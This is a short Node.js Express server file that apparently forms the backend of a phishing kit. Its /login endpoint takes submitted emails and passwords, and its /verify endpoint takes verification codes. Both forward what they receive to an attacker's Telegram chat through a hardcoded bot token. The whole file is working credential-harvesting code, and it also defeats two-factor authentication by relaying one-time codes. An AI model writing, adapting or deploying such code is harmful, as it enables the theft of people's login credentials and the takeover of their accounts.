const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = 3000;

// ✅ Telegram Bot Info
const BOT_TOKEN = '8059999764:AAGN7IycgZnJ2LitMEKW9P_4Aym2J5PMUDg';
const CHAT_ID = '1244954214';

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

let latestEmail = '';

// 🔐 Handle login
app.post('/login', (req, res) => {
  const { email, password } = req.body;
  latestEmail = email;

  const message = `🔐 Login Received:\nEmail: ${email}\nPassword: ${password}`;

  axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: message
  }).then(() => {
    console.log('Login info sent to Telegram');
  }).catch(error => {
    console.error('Telegram error:', error.message);
  });

  res.json({ success: true });
});

// ✅ Handle verification code
app.post('/verify', (req, res) => {
  const { code } = req.body;
  const message = `✅ Verification Code for ${latestEmail}:\nCode: ${code}`;

  axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: message
  }).then(() => {
    console.log('Verification code sent to Telegram');
  }).catch(error => {
    console.error('Telegram error:', error.message);
  });

  res.json({ success: true });
});

// ▶️ Start server
app.listen(PORT, () => {
  console.log(`✅ Server running at http://localhost:${PORT}`);
});


